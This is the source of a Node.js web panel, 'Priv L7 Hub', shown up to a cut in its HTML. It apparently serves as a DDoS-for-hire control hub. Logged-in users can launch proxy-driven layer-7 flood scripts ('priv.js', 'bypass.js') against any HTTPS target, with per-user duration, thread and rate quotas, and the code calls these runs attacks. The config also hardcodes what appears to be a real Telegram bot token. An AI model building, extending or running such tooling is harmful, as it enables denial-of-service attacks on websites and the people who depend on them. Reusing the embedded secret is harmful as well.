#!/usr/bin/env node
'use strict';

/*
 * Priv L7 Hub — single-file edition (multi-method)
 * Run: node hub.js
 */

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { spawn } = require('node:child_process');
const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const bcrypt = require('bcryptjs');

/* ---------- PATHS ---------- */
const SELF_PATH = fs.realpathSync(__filename);
const SCRIPT_DIR = path.dirname(SELF_PATH);

/* ---------- METHODS (hardcoded) ---------- */
const METHODS = [
  {
    id: 'priv',
    name: 'priv',
    file: 'priv.js',
    fields: ['target', 'duration', 'threads', 'rate'],
    buildArgs: function (input) {
      return [
        input.target,
        String(input.duration),
        'proxy.txt',
        String(input.threads),
        String(input.rate),
        '-c',
        '-h'
      ];
    },
    buildCommand: function (input) {
      return 'node priv.js ' + [
        input.target,
        input.duration,
        'proxy.txt',
        input.threads,
        input.rate,
        '-c',
        '-h'
      ].join(' ');
    }
  },
  {
    id: 'bypass',
    name: 'bypass',
    file: 'bypass.js',
    fields: ['target', 'duration', 'threads', 'rate', 'reqmethod', 'query', 'delay', 'limit'],
    buildArgs: function (input) {
      const args = [
        input.reqmethod,
        input.target,
        String(input.duration),
        String(input.threads),
        String(input.rate),
        'proxy.txt'
      ];
      if (input.query && input.query !== '0') args.push('--query', input.query);
      if (input.limit) args.push('--limit', 'true');
      if (input.delay && Number(input.delay) > 0) args.push('--delay', String(input.delay));
      return args;
    },
    buildCommand: function (input) {
      const parts = [
        'node bypass.js',
        input.reqmethod,
        input.target,
        input.duration,
        input.threads,
        input.rate,
        'proxy.txt'
      ];
      if (input.query && input.query !== '0') parts.push('--query', input.query);
      if (input.limit) parts.push('--limit', 'true');
      if (input.delay && Number(input.delay) > 0) parts.push('--delay', String(input.delay));
      return parts.join(' ');
    }
  }
];

/* ---------- CONFIG ---------- */
const CONFIG = Object.freeze({
  host: process.env.HUB_HOST || '0.0.0.0',
  port: Number(process.env.PORT || 3000),
  adminUsername: process.env.ADMIN_USERNAME || 'root',
  adminPasswordHash: process.env.ADMIN_PASSWORD_HASH || '',
  sessionSecret: process.env.SESSION_SECRET || 'change-me-' + crypto.randomBytes(16).toString('hex'),
  cookieSecure: String(process.env.COOKIE_SECURE || 'false') === 'true',
  maxSessions: Number(process.env.MAX_SESSIONS || 10),
  minPasswordLength: 3,
  dataDir: path.join(SCRIPT_DIR, 'privflood-data'),
  backupDir: path.join(SCRIPT_DIR, 'privflood-backups'),
  backupKeep: 30,
  botToken: process.env.BOT_TOKEN || '7704460856:AAGVMCei2tr-nDKpL-26gdIr6pOwfMfijd0',
  miniAppUrl: process.env.MINI_APP_URL || 'https://tr.dellix.ir'
});

for (const dir of [CONFIG.dataDir, CONFIG.backupDir]) {
  fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
}

const USERS_FILE = path.join(CONFIG.dataDir, 'users.json');
const AUDIT_FILE = path.join(CONFIG.dataDir, 'audit.log');
const BLACKLIST_FILE = path.join(CONFIG.dataDir, 'blacklist.json');
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]\n', { mode: 0o600 });
if (!fs.existsSync(BLACKLIST_FILE)) fs.writeFileSync(BLACKLIST_FILE, '[]\n', { mode: 0o600 });

/* ---------- HELPERS ---------- */
function readUsers() { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }

function backupFile(file, prefix) {
  if (!fs.existsSync(file)) return;
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const dest = path.join(CONFIG.backupDir, prefix + '-' + stamp + '.bak');
  try {
    fs.copyFileSync(file, dest, fs.constants.COPYFILE_EXCL);
    fs.chmodSync(dest, 0o600);
  } catch (e) {}
  const matches = fs.readdirSync(CONFIG.backupDir)
    .filter(n => n.startsWith(prefix + '-') && n.endsWith('.bak'))
    .sort().reverse();
  for (const old of matches.slice(CONFIG.backupKeep)) {
    try { fs.unlinkSync(path.join(CONFIG.backupDir, old)); } catch (e) {}
  }
}

function writeUsers(users) {
  backupFile(USERS_FILE, 'users');
  const tmp = USERS_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(users, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, USERS_FILE);
}

function readBlacklist() {
  try { return JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')); }
  catch (e) { return []; }
}

function writeBlacklist(list) {
  backupFile(BLACKLIST_FILE, 'blacklist');
  const tmp = BLACKLIST_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(list, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, BLACKLIST_FILE);
}

function audit(event, actor, details) {
  const row = JSON.stringify({
    at: new Date().toISOString(),
    event: event,
    actor: actor || 'system',
    details: details || {}
  });
  try { fs.appendFileSync(AUDIT_FILE, row + '\n', { mode: 0o600 }); } catch (e) {}
}

// A limit of 0 = unlimited. Numeric otherwise.
function normalizeLimit(v, fallback) {
  if (v === undefined || v === null || v === '') return fallback;
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0) return fallback;
  return Math.floor(n);
}

function unlimitedLimits() {
  return { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0 };
}

function safeUser(u) {
  if (u.role === 'admin') {
    return {
      username: u.username,
      role: u.role,
      createdAt: u.createdAt,
      limits: unlimitedLimits()
    };
  }
  return {
    username: u.username,
    role: u.role,
    createdAt: u.createdAt,
    limits: {
      maxDuration: normalizeLimit(u.maxDuration, 0),
      maxThreads: normalizeLimit(u.maxThreads, 0),
      maxRate: normalizeLimit(u.maxRate, 0),
      maxConcurrent: normalizeLimit(u.maxConcurrent, 0)
    }
  };
}

function validUsername(s) { return typeof s === 'string' && /^[a-zA-Z0-9_.-]{3,32}$/.test(s); }
function validPassword(s) {
  return typeof s === 'string' && s.length >= CONFIG.minPasswordLength && s.length <= 200;
}

function getMethods() {
  return METHODS.filter(function (m) {
    try { return fs.existsSync(path.join(SCRIPT_DIR, m.file)); }
    catch (e) { return false; }
  }).map(function (m) {
    return { id: m.id, name: m.name };
  });
}

function getMethodById(id) {
  return METHODS.find(function (m) { return m.id === id; });
}

function validateTarget(raw) {
  let u;
  try { u = new URL(raw); } catch (e) { throw new Error('Enter a valid HTTPS URL.'); }
  if (u.protocol !== 'https:') throw new Error('Only HTTPS targets are allowed.');
  return { url: raw, host: u.hostname.toLowerCase() };
}

function hostMatchesPattern(host, pattern) {
  const p = String(pattern || '').trim().toLowerCase();
  if (!p) return false;
  if (p.startsWith('*.')) {
    const base = p.slice(2);
    return host === base || host.endsWith('.' + base);
  }
  return host === p;
}

function isBlacklisted(host) {
  const list = readBlacklist();
  return list.some(function (entry) { return hostMatchesPattern(host, entry); });
}

/* ---------- PROCESS KILL HELPERS ---------- */
function killTree(child, signal) {
  if (!child || child.killed) return;
  const pid = child.pid;
  if (!pid) return;
  try {
    process.kill(-pid, signal);
  } catch (e) {
    try { child.kill(signal); } catch (e2) {}
  }
}

/* ---------- EXPRESS ---------- */
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://telegram.org"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'self'", "https://web.telegram.org", "https://*.telegram.org"],
      upgradeInsecureRequests: null
    }
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: false,
  crossOriginOpenerPolicy: false
}));

app.use(express.json({ limit: '64kb' }));
app.use(express.urlencoded({ extended: false, limit: '64kb' }));

app.use(session({
  name: 'privhub.sid',
  secret: CONFIG.sessionSecret,
  resave: false,
  saveUninitialized: false,
  proxy: true,
  cookie: {
    httpOnly: true,
    sameSite: CONFIG.cookieSecure ? 'none' : 'lax',
    secure: CONFIG.cookieSecure,
    maxAge: 8 * 60 * 60 * 1000
  }
}));

app.use('/api/', rateLimit({
  windowMs: 60_000,
  limit: 300,
  standardHeaders: true,
  legacyHeaders: false
}));

const sessions = new Map();
const logs = new Map();

function auth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Please sign in.' });
  next();
}
function admin(req, res, next) {
  if (!req.session.user || req.session.user.role !== 'admin')
    return res.status(403).json({ error: 'Administrator access required.' });
  next();
}

function getUserLimits(username) {
  const users = readUsers();
  const u = users.find(function (x) { return x.username === username; });
  if (!u) return null;
  return safeUser(u).limits;
}

function countUserSessions(username) {
  let n = 0;
  for (const s of sessions.values()) {
    if (s.owner === username) n += 1;
  }
  return n;
}

function viewSession(s) {
  const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
  return {
    id: s.id,
    method: s.method,
    target: s.target,
    duration: s.duration,
    startedAt: s.startedAt,
    elapsedSeconds: Math.min(elapsed, s.duration),
    status: s.status,
    owner: s.owner,
    command: s.command
  };
}

function logChunk(id, chunk) {
  logs.set(id, ((logs.get(id) || '') + chunk.toString()).slice(-10000));
}

function stopSession(id, reason) {
  const s = sessions.get(id);
  if (!s) return false;
  if (s.timer) clearTimeout(s.timer);
  s.status = 'stopping';
  sessions.delete(id);
  killTree(s.child, 'SIGKILL');
  const cleanup = setTimeout(function () {
    logs.delete(id);
  }, 1500);
  cleanup.unref();
  audit('process_stop_requested', s.owner, {
    id: id,
    method: s.method,
    reason: reason || 'manual'
  });
  return true;
}

/* ---------- API ---------- */
app.get('/api/health', function (_req, res) { res.json({ ok: true }); });

app.post('/api/login', async function (req, res) {
  const body = req.body || {};
  const username = body.username;
  const password = body.password;
  if (typeof username !== 'string' || typeof password !== 'string')
    return res.status(400).json({ error: 'Enter username and password.' });

  let users = readUsers();
  let u = users.find(function (x) { return x.username.toLowerCase() === username.toLowerCase(); });

  if (!u && username === CONFIG.adminUsername && CONFIG.adminPasswordHash &&
      await bcrypt.compare(password, CONFIG.adminPasswordHash)) {
    u = {
      username: CONFIG.adminUsername,
      passwordHash: CONFIG.adminPasswordHash,
      role: 'admin',
      createdAt: new Date().toISOString()
    };
    users.push(u);
    writeUsers(users);
    audit('admin_bootstrapped', u.username);
  }

  if (!u || !(await bcrypt.compare(password, u.passwordHash))) {
    audit('login_failed', username.slice(0, 32));
    return res.status(401).json({ error: 'Incorrect username or password.' });
  }

  req.session.regenerate(function (err) {
    if (err) return res.status(500).json({ error: 'Unable to create session.' });
    req.session.user = safeUser(u);
    req.session.save(function (saveErr) {
      if (saveErr) return res.status(500).json({ error: 'Unable to save session.' });
      audit('login_success', u.username);
      res.json({ user: req.session.user });
    });
  });
});

app.get('/api/me', auth, function (req, res) {
  res.json({ user: req.session.user });
});

app.post('/api/logout', auth, function (req, res) {
  audit('logout', req.session.user.username);
  req.session.destroy(function () { res.json({ ok: true }); });
});

app.post('/api/account', auth, async function (req, res) {
  const body = req.body || {};
  const currentPassword = body.currentPassword;
  const newUsername = body.newUsername;
  const newPassword = body.newPassword;
  const users = readUsers();
  const i = users.findIndex(function (u) { return u.username === req.session.user.username; });

  if (i < 0 || !(await bcrypt.compare(String(currentPassword || ''), users[i].passwordHash)))
    return res.status(400).json({ error: 'Current password is incorrect.' });

  if (newUsername) {
    if (!validUsername(newUsername))
      return res.status(400).json({ error: 'Username must be 3-32 valid characters.' });
    if (users.some(function (u, j) {
      return j !== i && u.username.toLowerCase() === newUsername.toLowerCase();
    })) return res.status(409).json({ error: 'Username already exists.' });
    users[i].username = newUsername;
  }
  if (newPassword) {
    if (!validPassword(newPassword))
      return res.status(400).json({ error: 'New password must be at least ' + CONFIG.minPasswordLength + ' characters.' });
    users[i].passwordHash = await bcrypt.hash(newPassword, 12);
  }
  writeUsers(users);
  req.session.user = safeUser(users[i]);
  audit('account_updated', users[i].username);
  res.json({ user: req.session.user });
});

app.get('/api/users', auth, admin, function (_req, res) {
  res.json({ users: readUsers().map(safeUser) });
});

app.post('/api/users', auth, admin, async function (req, res) {
  const body = req.body || {};
  const username = body.username;
  const password = body.password;
  if (!validUsername(username))
    return res.status(400).json({ error: 'Invalid username.' });
  if (!validPassword(password))
    return res.status(400).json({ error: 'Password must be at least ' + CONFIG.minPasswordLength + ' characters.' });

  const maxDuration = normalizeLimit(body.maxDuration, 0);
  const maxThreads = normalizeLimit(body.maxThreads, 0);
  const maxRate = normalizeLimit(body.maxRate, 0);
  const maxConcurrent = normalizeLimit(body.maxConcurrent, 0);

  const users = readUsers();
  if (users.some(function (u) { return u.username.toLowerCase() === username.toLowerCase(); }))
    return res.status(409).json({ error: 'Username already exists.' });
  const u = {
    username: username,
    passwordHash: await bcrypt.hash(password, 12),
    role: 'user',
    createdAt: new Date().toISOString(),
    maxDuration: maxDuration,
    maxThreads: maxThreads,
    maxRate: maxRate,
    maxConcurrent: maxConcurrent
  };
  users.push(u);
  writeUsers(users);
  audit('user_created', req.session.user.username, { username: username, limits: {
    maxDuration: maxDuration, maxThreads: maxThreads, maxRate: maxRate, maxConcurrent: maxConcurrent
  }});
  res.status(201).json({ user: safeUser(u) });
});

app.put('/api/users/:username', auth, admin, async function (req, res) {
  const target = req.params.username;
  const body = req.body || {};
  const users = readUsers();
  const i = users.findIndex(function (u) { return u.username === target; });
  if (i < 0) return res.status(404).json({ error: 'User not found.' });
  if (users[i].role === 'admin' && target !== req.session.user.username)
    return res.status(403).json({ error: 'Cannot modify another admin.' });

  if (body.maxDuration !== undefined) users[i].maxDuration = normalizeLimit(body.maxDuration, 0);
  if (body.maxThreads !== undefined) users[i].maxThreads = normalizeLimit(body.maxThreads, 0);
  if (body.maxRate !== undefined) users[i].maxRate = normalizeLimit(body.maxRate, 0);
  if (body.maxConcurrent !== undefined) users[i].maxConcurrent = normalizeLimit(body.maxConcurrent, 0);
  if (body.password) {
    if (!validPassword(body.password))
      return res.status(400).json({ error: 'Password must be at least ' + CONFIG.minPasswordLength + ' characters.' });
    users[i].passwordHash = await bcrypt.hash(body.password, 12);
  }
  writeUsers(users);
  audit('user_updated', req.session.user.username, { username: target });
  res.json({ user: safeUser(users[i]) });
});

app.delete('/api/users/:username', auth, admin, function (req, res) {
  const target = req.params.username;
  if (target === req.session.user.username)
    return res.status(400).json({ error: 'Cannot delete yourself.' });
  const users = readUsers();
  const i = users.findIndex(function (u) { return u.username === target; });
  if (i < 0) return res.status(404).json({ error: 'User not found.' });
  if (users[i].role === 'admin')
    return res.status(403).json({ error: 'Cannot delete an admin.' });
  users.splice(i, 1);
  writeUsers(users);
  audit('user_deleted', req.session.user.username, { username: target });
  res.json({ ok: true });
});

/* ---------- BLACKLIST ---------- */
app.get('/api/blacklist', auth, admin, function (_req, res) {
  res.json({ blacklist: readBlacklist() });
});

app.post('/api/blacklist', auth, admin, function (req, res) {
  const body = req.body || {};
  const pattern = String(body.pattern || '').trim().toLowerCase();
  if (!pattern) return res.status(400).json({ error: 'Pattern required.' });
  if (!/^(\*\.)?[a-z0-9.-]+\.[a-z]{2,}$/.test(pattern))
    return res.status(400).json({ error: 'Pattern must be a domain or *.domain (e.g. example.com or *.example.com).' });
  const list = readBlacklist();
  if (list.indexOf(pattern) !== -1)
    return res.status(409).json({ error: 'Already blacklisted.' });
  list.push(pattern);
  writeBlacklist(list);
  audit('blacklist_added', req.session.user.username, { pattern: pattern });
  res.status(201).json({ blacklist: list });
});

app.delete('/api/blacklist/:pattern', auth, admin, function (req, res) {
  const pattern = String(req.params.pattern || '').trim().toLowerCase();
  const list = readBlacklist();
  const i = list.indexOf(pattern);
  if (i < 0) return res.status(404).json({ error: 'Not found.' });
  list.splice(i, 1);
  writeBlacklist(list);
  audit('blacklist_removed', req.session.user.username, { pattern: pattern });
  res.json({ blacklist: list });
});

/* ---------- METHODS ---------- */
app.get('/api/methods', auth, function (_req, res) {
  const proxyExists = fs.existsSync(path.join(SCRIPT_DIR, 'proxy.txt'));
  res.json({
    methods: getMethods().map(function (m) {
      const full = getMethodById(m.id);
      return { id: m.id, name: m.name, fields: full.fields };
    }),
    dir: SCRIPT_DIR,
    proxy: 'proxy.txt',
    proxyExists: proxyExists,
    minPasswordLength: CONFIG.minPasswordLength
  });
});

app.get('/api/sessions', auth, function (_req, res) {
  res.json({
    sessions: Array.from(sessions.values()).map(viewSession),
    capacity: CONFIG.maxSessions,
    available: CONFIG.maxSessions - sessions.size
  });
});

app.get('/api/sessions/:id/logs', auth, function (req, res) {
  const s = sessions.get(req.params.id);
  if (s && s.owner !== req.session.user.username && req.session.user.role !== 'admin')
    return res.status(403).json({ error: 'Not your process.' });
  res.json({ logs: logs.get(req.params.id) || '' });
});

app.post('/api/sessions', auth, function (req, res) {
  if (sessions.size >= CONFIG.maxSessions)
    return res.status(409).json({ error: 'All process slots are in use.' });

  const limits = getUserLimits(req.session.user.username) || unlimitedLimits();

  if (limits.maxConcurrent > 0) {
    const userActive = countUserSessions(req.session.user.username);
    if (userActive >= limits.maxConcurrent)
      return res.status(429).json({
        error: 'You already have ' + userActive + ' active session(s). Your limit is ' + limits.maxConcurrent + '.'
      });
  }

  const body = req.body || {};
  const method = getMethodById(body.method);
  if (!method)
    return res.status(400).json({ error: 'Unknown method.' });

  const methodPath = path.join(SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath))
    return res.status(400).json({ error: 'Method file missing: ' + method.file });

  let t;
  try { t = validateTarget(String(body.target || '')); }
  catch (e) { return res.status(400).json({ error: e.message }); }

  if (req.session.user.role !== 'admin' && isBlacklisted(t.host))
    return res.status(403).json({ error: 'This target is blacklisted.' });

  const d = Number(body.duration);
  const th = Number(body.threads);
  const r = Number(body.rate);

  if (!Number.isInteger(d) || d < 1)
    return res.status(400).json({ error: 'Duration must be at least 1.' });
  if (limits.maxDuration > 0 && d > limits.maxDuration)
    return res.status(400).json({ error: 'Duration must be 1-' + limits.maxDuration + ' (your limit).' });

  if (!Number.isInteger(th) || th < 1)
    return res.status(400).json({ error: 'Threads must be at least 1.' });
  if (limits.maxThreads > 0 && th > limits.maxThreads)
    return res.status(400).json({ error: 'Threads must be 1-' + limits.maxThreads + ' (your limit).' });

  if (!Number.isInteger(r) || r < 1)
    return res.status(400).json({ error: 'Rate must be at least 1.' });
  if (limits.maxRate > 0 && r > limits.maxRate)
    return res.status(400).json({ error: 'Rate must be 1-' + limits.maxRate + ' (your limit).' });

  const input = {
    target: t.url,
    duration: d,
    threads: th,
    rate: r,
    reqmethod: String(body.reqmethod || 'GET').toUpperCase() === 'POST' ? 'POST' : 'GET',
    query: body.query && ['0', '1', '2', '3'].includes(String(body.query)) ? String(body.query) : '0',
    limit: body.limit === true || body.limit === 'true' || body.limit === 'on',
    delay: Number(body.delay || 0)
  };

  const cmdArgs = method.buildArgs(input);
  const commandPreview = method.buildCommand(input);

  const child = spawn(process.execPath, [methodPath].concat(cmdArgs), {
    cwd: SCRIPT_DIR,
    shell: false,
    stdio: ['ignore', 'pipe', 'pipe'],
    detached: true,
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' }
  });

  const id = crypto.randomUUID();
  const s = {
    id: id,
    method: method.name,
    target: t.host,
    duration: d,
    startedAt: Date.now(),
    status: 'running',
    owner: req.session.user.username,
    child: child,
    command: commandPreview
  };
  sessions.set(id, s);
  logs.set(id, '');
  logChunk(id, '$ ' + commandPreview + '\n\n');

  child.stdout.on('data', function (c) { logChunk(id, c); });
  child.stderr.on('data', function (c) { logChunk(id, c); });
  child.on('error', function (e) {
    logChunk(id, '\nProcess error: ' + e.message);
    sessions.delete(id);
  });
  child.on('close', function (code, signal) {
    logChunk(id, '\nExited: code=' + code + ', signal=' + signal);
    sessions.delete(id);
    audit('process_exit', s.owner, { id: id, code: code, signal: signal });
  });

  s.timer = setTimeout(function () { stopSession(id, 'duration_expired'); }, d * 1000);
  if (typeof s.timer.unref === 'function') {
    s.timer.unref();
  }

  audit('process_started', s.owner, {
    id: id, method: s.method, target: t.host, duration: d, threads: th, rate: r,
    command: commandPreview
  });
  res.status(201).json({ session: viewSession(s) });
});

/* ---------- TERMINATE ATTACK RULE ENFORCEMENT ---------- */
app.delete('/api/sessions/:id', auth, function (req, res) {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Process is not running.' });

  const isOwner = (s.owner === req.session.user.username);
  const isAdmin = (req.session.user.role === 'admin');

  if (!isOwner && !isAdmin) {
    return res.status(403).json({ error: 'Only the creator or an administrator can terminate this attack.' });
  }

  stopSession(s.id, isAdmin && !isOwner ? 'admin_terminated' : 'manual');
  res.json({ ok: true });
});

/* ---------- UI ---------- */
const HTML = [
'<!doctype html>',
'<html lang="en"><head><meta charset="utf-8">',
'<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">',
'<meta name="theme-color" content="#0b0d12">',
'<title>PRIV L7 HUB</title>',
'<link rel="stylesheet" href="/ui.css">',
'<script src="https://telegram.org/js/telegram-web-app.js"></script>',
'</head><body>',

/* ---------- LOADER: worldwide attack map ---------- */
'<div id="loader" class="loader">',
'<div class="map-scene">',
'<svg class="map-svg" viewBox="0 0 800 400" aria-hidden="true" preserveAspectRatio="xMidYMid meet">',
'<defs>',
'<linearGradient id="arcGrad" x1="0" y1="0" x2="1" y2="0">',
'<stop offset="0%" stop-color="#5f6b7e" stop-opacity="0"/>',
'<stop offset="40%" stop-color="#e4e8ee" stop-opacity="1"/>',
'<stop offset="100%" stop-color="#a8b3c5" stop-opacity="0.2"/>',
'</linearGradient>',
'<radialGradient id="pulseGrad">',
'<stop offset="0%" stop-color="#e4e8ee" stop-opacity="0.9"/>',
'<stop offset="100%" stop-color="#e4e8ee" stop-opacity="0"/>',
'</radialGradient>',
'<filter id="glow"><feGaussianBlur stdDeviation="2.2" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>',
'</defs>',

/* dotted world map: dots across approximate continents (grid of tiny circles) */
'<g id="worldDots" fill="#2a3142">',
/* North America */
'<circle cx="80" cy="110" r="1.4"/><circle cx="100" cy="100" r="1.4"/><circle cx="120" cy="95" r="1.4"/><circle cx="140" cy="95" r="1.4"/><circle cx="160" cy="100" r="1.4"/><circle cx="90" cy="130" r="1.4"/><circle cx="110" cy="120" r="1.4"/><circle cx="130" cy="115" r="1.4"/><circle cx="150" cy="120" r="1.4"/><circle cx="170" cy="120" r="1.4"/><circle cx="100" cy="150" r="1.4"/><circle cx="120" cy="145" r="1.4"/><circle cx="140" cy="145" r="1.4"/><circle cx="160" cy="145" r="1.4"/><circle cx="120" cy="170" r="1.4"/><circle cx="140" cy="170" r="1.4"/><circle cx="160" cy="170" r="1.4"/>',
/* South America */
'<circle cx="180" cy="200" r="1.4"/><circle cx="195" cy="215" r="1.4"/><circle cx="205" cy="230" r="1.4"/><circle cx="210" cy="250" r="1.4"/><circle cx="215" cy="270" r="1.4"/><circle cx="220" cy="290" r="1.4"/><circle cx="215" cy="310" r="1.4"/><circle cx="200" cy="240" r="1.4"/><circle cx="200" cy="265" r="1.4"/><circle cx="195" cy="285" r="1.4"/>',
/* Europe */
'<circle cx="360" cy="100" r="1.4"/><circle cx="380" cy="95" r="1.4"/><circle cx="400" cy="95" r="1.4"/><circle cx="420" cy="100" r="1.4"/><circle cx="370" cy="115" r="1.4"/><circle cx="390" cy="110" r="1.4"/><circle cx="410" cy="115" r="1.4"/><circle cx="430" cy="120" r="1.4"/><circle cx="400" cy="130" r="1.4"/><circle cx="420" cy="130" r="1.4"/>',
/* Africa */
'<circle cx="380" cy="160" r="1.4"/><circle cx="400" cy="160" r="1.4"/><circle cx="420" cy="160" r="1.4"/><circle cx="390" cy="180" r="1.4"/><circle cx="410" cy="180" r="1.4"/><circle cx="430" cy="180" r="1.4"/><circle cx="400" cy="200" r="1.4"/><circle cx="420" cy="200" r="1.4"/><circle cx="410" cy="220" r="1.4"/><circle cx="420" cy="240" r="1.4"/><circle cx="420" cy="260" r="1.4"/><circle cx="430" cy="280" r="1.4"/>',
/* Middle East / Russia */
'<circle cx="460" cy="100" r="1.4"/><circle cx="480" cy="95" r="1.4"/><circle cx="500" cy="95" r="1.4"/><circle cx="520" cy="100" r="1.4"/><circle cx="540" cy="95" r="1.4"/><circle cx="560" cy="100" r="1.4"/><circle cx="580" cy="95" r="1.4"/><circle cx="460" cy="120" r="1.4"/><circle cx="480" cy="120" r="1.4"/><circle cx="500" cy="120" r="1.4"/><circle cx="520" cy="125" r="1.4"/><circle cx="540" cy="125" r="1.4"/>',
/* Asia */
'<circle cx="600" cy="100" r="1.4"/><circle cx="620" cy="105" r="1.4"/><circle cx="640" cy="110" r="1.4"/><circle cx="660" cy="115" r="1.4"/><circle cx="600" cy="130" r="1.4"/><circle cx="620" cy="130" r="1.4"/><circle cx="640" cy="135" r="1.4"/><circle cx="660" cy="140" r="1.4"/><circle cx="680" cy="120" r="1.4"/><circle cx="700" cy="130" r="1.4"/><circle cx="620" cy="150" r="1.4"/><circle cx="640" cy="160" r="1.4"/><circle cx="660" cy="165" r="1.4"/><circle cx="680" cy="160" r="1.4"/>',
/* SE Asia / Australia */
'<circle cx="640" cy="200" r="1.4"/><circle cx="660" cy="210" r="1.4"/><circle cx="680" cy="220" r="1.4"/><circle cx="700" cy="230" r="1.4"/><circle cx="660" cy="250" r="1.4"/><circle cx="680" cy="260" r="1.4"/><circle cx="700" cy="265" r="1.4"/><circle cx="720" cy="255" r="1.4"/><circle cx="680" cy="280" r="1.4"/><circle cx="700" cy="285" r="1.4"/>',
'</g>',

/* graticule faint lines */
'<g stroke="#141821" stroke-width="0.6" fill="none">',
'<line x1="0" y1="200" x2="800" y2="200"/>',
'<line x1="200" y1="0" x2="200" y2="400"/>',
'<line x1="400" y1="0" x2="400" y2="400"/>',
'<line x1="600" y1="0" x2="600" y2="400"/>',
'</g>',

/* Origin pulsing nodes */
'<g filter="url(#glow)">',
'<circle cx="120" cy="145" r="2.5" fill="#e4e8ee">',
'<animate attributeName="r" values="2.5;3.2;2.5" dur="1.6s" repeatCount="indefinite"/>',
'</circle>',
'<circle cx="120" cy="145" r="0" fill="none" stroke="#e4e8ee" stroke-width="1">',
'<animate attributeName="r" from="3" to="20" dur="2s" repeatCount="indefinite"/>',
'<animate attributeName="opacity" from="0.8" to="0" dur="2s" repeatCount="indefinite"/>',
'</circle>',

'<circle cx="400" cy="115" r="2.5" fill="#e4e8ee">',
'<animate attributeName="r" values="2.5;3.2;2.5" dur="1.6s" begin="0.4s" repeatCount="indefinite"/>',
'</circle>',
'<circle cx="400" cy="115" r="0" fill="none" stroke="#e4e8ee" stroke-width="1">',
'<animate attributeName="r" from="3" to="20" dur="2s" begin="0.4s" repeatCount="indefinite"/>',
'<animate attributeName="opacity" from="0.8" to="0" dur="2s" begin="0.4s" repeatCount="indefinite"/>',
'</circle>',

'<circle cx="660" cy="140" r="2.5" fill="#e4e8ee">',
'<animate attributeName="r" values="2.5;3.2;2.5" dur="1.6s" begin="0.8s" repeatCount="indefinite"/>',
'</circle>',
'<circle cx="660" cy="140" r="0" fill="none" stroke="#e4e8ee" stroke-width="1">',
'<animate attributeName="r" from="3" to="20" dur="2s" begin="0.8s" repeatCount="indefinite"/>',
'<animate attributeName="opacity" from="0.8" to="0" dur="2s" begin="0.8s" repeatCount="indefinite"/>',
'</circle>',
'</g>',

/* Target on Asia (final destination) */
'<circle cx="600" cy="130" r="3" fill="#a8b3c5">',
'<animate attributeName="r" values="3;4;3" dur="1.2s" repeatCount="indefinite"/>',
'</circle>',
'<circle cx="600" cy="130" r="0" fill="none" stroke="#a8b3c5" stroke-width="1.5">',
'<animate attributeName="r" from="4" to="30" dur="2s" repeatCount="indefinite"/>',
'<animate attributeName="opacity" from="0.9" to="0" dur="2s" repeatCount="indefinite"/>',
'</circle>',

/* Attack arcs from origins to Asia target - animated dashed path */
'<path d="M120,145 Q360,20 600,130" fill="none" stroke="url(#arcGrad)" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="120 400" filter="url(#glow)">',
'<animate attributeName="stroke-dashoffset" from="520" to="0" dur="2.4s" repeatCount="indefinite"/>',
'</path>',
'<path d="M400,115 Q500,60 600,130" fill="none" stroke="url(#arcGrad)" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="100 400" filter="url(#glow)">',
'<animate attributeName="stroke-dashoffset" from="500" to="0" dur="2s" begin="0.4s" repeatCount="indefinite"/>',
'</path>',
'<path d="M660,140 Q640,120 600,130" fill="none" stroke="url(#arcGrad)" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="60 300" filter="url(#glow)">',
'<animate attributeName="stroke-dashoffset" from="360" to="0" dur="1.6s" begin="0.8s" repeatCount="indefinite"/>',
'</path>',

/* Travelling packet dots along each arc */
'<circle r="3" fill="#e4e8ee" filter="url(#glow)">',
'<animateMotion dur="2.4s" repeatCount="indefinite" path="M120,145 Q360,20 600,130"/>',
'<animate attributeName="opacity" values="0;1;1;0" dur="2.4s" repeatCount="indefinite"/>',
'</circle>',
'<circle r="3" fill="#e4e8ee" filter="url(#glow)">',
'<animateMotion dur="2s" begin="0.4s" repeatCount="indefinite" path="M400,115 Q500,60 600,130"/>',
'<animate attributeName="opacity" values="0;1;1;0" dur="2s" begin="0.4s" repeatCount="indefinite"/>',
'</circle>',
'<circle r="3" fill="#e4e8ee" filter="url(#glow)">',
'<animateMotion dur="1.6s" begin="0.8s" repeatCount="indefinite" path="M660,140 Q640,120 600,130"/>',
'<animate attributeName="opacity" values="0;1;1;0" dur="1.6s" begin="0.8s" repeatCount="indefinite"/>',
'</circle>',

/* Target ping rings on impact */
'<circle cx="600" cy="130" r="0" fill="none" stroke="#e4e8ee" stroke-width="1.2" opacity="0">',
